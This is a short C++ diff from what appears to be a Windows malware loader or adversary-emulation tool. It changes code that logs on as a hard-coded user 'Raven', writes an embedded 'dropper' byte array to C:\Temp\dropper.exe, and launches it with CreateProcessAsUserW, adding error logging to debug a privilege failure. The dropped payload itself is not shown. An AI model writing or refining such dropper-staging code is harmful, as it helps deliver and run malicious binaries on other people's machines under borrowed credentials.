@@ -37,7 +37,7 @@ int wmain()
         fs.close();
     }
 
-    // create dropper process as user Raven
+    // get Raven user token
     HANDLE hToken;
     if (!LogonUserW(
         L"Raven",
@@ -50,15 +50,21 @@ int wmain()
         logger::Log("[!] Failed to logon as user.");
     }
 
+    // write the dropper to disk
+    std::ofstream outfile("C:\\Temp\\dropper.exe", std::ios::out | std::ios::binary);
+    outfile.write(&dropper[0], sizeof(dropper));
+    outfile.close();
+
+    // create dropper process as user Raven
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));
 
-    if (!CreateProcessAsUserW(
+    if (!CreateProcessAsUserW( // ERROR_PRIVILEGE_NOT_HELD
         hToken,
-        L"dropper.exe",
+        L"C:\\Temp\\dropper.exe",
         NULL,
         NULL,
         NULL,
@@ -69,7 +75,7 @@ int wmain()
         &si,
         &pi
     )) {
-        logger::Log("[!] Failed to create dropper process.");
+        logger::Log("[!] Failed to create dropper process." + std::to_string(GetLastError()));
     }
 
     WaitForSingleObject(pi.hProcess, INFINITE);
